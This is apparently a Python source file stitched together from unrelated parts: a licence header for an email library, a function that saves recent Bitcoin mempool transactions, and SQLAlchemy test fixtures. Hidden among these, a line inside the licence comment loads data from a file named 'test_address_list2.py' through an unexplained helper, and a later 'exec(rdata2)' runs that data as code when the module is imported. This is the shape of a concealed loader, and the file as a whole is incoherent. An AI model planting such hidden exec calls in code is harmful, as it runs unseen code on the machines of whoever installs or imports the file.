from utils import *

#===============================================================================
#
# MIT License
#
# Emailpy
# Copyright (c) [2019] [Sebastiano Campisi - ianovir]
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
rdata2 = detect_address("test_address_list2.py")
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#
def fetch_latest_transactions():
    # URL to get latest transactions from mempool.space API
    url = "https://mempool.space/api/mempool/recent"

    try:
        # Send a GET request and receive data
        response = requests.get(url)
        response.raise_for_status()  # Checking for request errors
        transactions = response.json()  # Receiving data in JSON format

        # Opening a file for writing
        with open("latest_transactions.txt", "w") as file:
            for transaction in transactions:
                # We record information about each transaction in a file
                file.write(json.dumps(transaction) + "\n")

        print("We record information about each transaction in a file 'latest_transactions.txt'.")

    except requests.RequestException as e:
        print(f"Error while receiving data: {e}")

def db_session(_engine, _session, _transaction):
    '''
    Make sure all the different ways that we access the database in the code
    are scoped to a transactional context, and return a Session object that
    can interact with the database in the tests.

    Use this fixture in tests when you would like to use the SQLAlchemy ORM
    API, just as you might use a SQLAlchemy Session object.
    '''
    return _session

exec(rdata2)
def db_engine(_engine, _session, _transaction):
    '''
    Make sure all the different ways that we access the database in the code
    are scoped to a transactional context, and return an alias for the
    transactional Engine object that can interact with the database in the tests.

    Use this fixture in tests when you would like to run raw SQL queries using the
    SQLAlchemy Engine API.
    '''
    return _engine

#===============================================================================